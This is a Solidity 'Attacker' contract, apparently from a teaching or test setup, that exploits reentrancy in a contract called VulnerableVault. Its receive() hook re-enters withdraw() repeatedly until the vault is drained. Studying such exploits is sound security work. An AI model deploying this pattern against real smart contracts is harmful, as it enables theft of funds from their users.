// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IVault {
    function deposit() external payable;
    function withdraw() external;
}

/// @title Attacker
/// @notice Exploits VulnerableVault's reentrancy to drain more than it deposited.
///         The `receive()` hook re-enters `withdraw()` until the vault is empty.
contract Attacker {
    IVault public immutable vault;
    uint256 public immutable unit;

    constructor(address _vault) payable {
        vault = IVault(_vault);
        unit = msg.value; // the deposit size used to seed the attack
    }

    /// @notice Seed one deposit, then trigger the first withdraw which reenters.
    function attack() external {
        vault.deposit{value: unit}();
        vault.withdraw();
    }

    /// @dev Reentrancy hook: while the vault still thinks we have a balance,
    ///      keep withdrawing until it runs dry.
    receive() external payable {
        if (address(vault).balance >= unit) {
            vault.withdraw();
        }
    }

    function loot() external view returns (uint256) {
        return address(this).balance;
    }
}
